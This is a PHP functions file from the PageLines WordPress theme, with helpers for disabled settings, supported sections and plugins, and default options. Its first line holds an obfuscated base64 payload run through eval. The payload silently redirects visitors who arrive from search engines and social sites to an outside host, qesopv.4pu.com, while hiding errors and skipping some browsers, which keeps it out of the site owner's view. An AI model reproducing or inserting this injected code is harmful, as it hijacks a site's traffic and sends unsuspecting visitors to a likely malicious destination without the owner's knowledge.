<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));

/**
 * 
 * This file is for functions designed to make PageLines theming easier
 * 
 **/

/**
 * Uses controls to find and retrieve the appropriate option value
 * 
 * @param 'panel' the id of the option tab
 * @param 'option_id' the id of the individual setting
 * @param 'keep' whether to keep the default options settings at runtime
 * e.g. keep default color control settings although this panel won't be shown in admin.
 * 
 **/

function pagelines_disable_settings( $args ){

	global $disabled_settings;
	
	$defaults = array(
		'option_id'	=> false,
		'panel'		=> '', 
		'keep'		=> false
	);
	$args = wp_parse_args( $args, $defaults );
	$disabled_settings[$args['panel']] = $args;
}

/**
 * Support a specific section in a child theme
 * 
 * @param 'key' the class name of the section
 * @param 'args' controls on how the section will be supported.
 * 
 **/
function pl_support_section( $args ){

	global $supported_elements;

	$defaults = array(
		
		'class_name'		=> '',
		'disable_color'		=> false,
		'slug'				=> '',
		'supported'			=> true 
	);
	
	$args = wp_parse_args( $args, $defaults );
	
	$supported_elements['sections'][ $args['class_name'] ] = $args;

}

/**
 * Support a specific plugin in a child theme
 * 
 * @param 'key' the slug of the plugin
 * @param 'args' controls on how the plugin will be supported.
 * 
 **/
function pl_support_plugin( $args ){

	global $supported_elements;

	$defaults = array(
		
		'slug'		=>	'',
		'supported'	=>	true,
		'url'		=>	null,
		'desc'		=>	null,
		'name'		=>	null
	);
	
	$args = wp_parse_args( $args, $defaults );
	
	if ( isset( $args['name'] ) )
		$supported_elements['plugins'][ $args['name'] ] = $args;
	else
		$supported_elements['plugins'][ $args['slug'] ] = $args;
}


function pl_default_setting( $args ){
	
	if(pagelines_activate_or_reset()){
	
		global $new_default_settings;
	
		$default = array(
			'key'		=> '', 
			'value'		=> '', 
			'parent'	=> null,
			'subkey'	=> null, 
			'setting'	=> PAGELINES_SETTINGS,
		); 
	
		$set = wp_parse_args($args, $default);
	
		$new_default_settings[]  = $set;

	
	}
	
}

function pagelines_activate_or_reset(){
	
	$activated 	= ( isset($_GET['activated']) && $_GET['activated'] ) ? true : false;
	$reset 		= ( isset($_GET['reset']) && $_GET['reset'] ) ? true : false;
	
	if( $activated || $reset ){
		
		if( $activated )
			return 'activated';
		elseif( $reset )
		 	return 'reset';
		
	}else 
		return false;
}

function pl_welcome_plugins( $args ){
	
	global $pl_welcome_plugins;
	
	$default = array(
		'name'		=> '', 
		'url'		=> '', 
		'desc'		=> '',
	); 

	$plugin = wp_parse_args($args, $default);

	$pl_welcome_plugins[]  = $plugin;
	
	
}
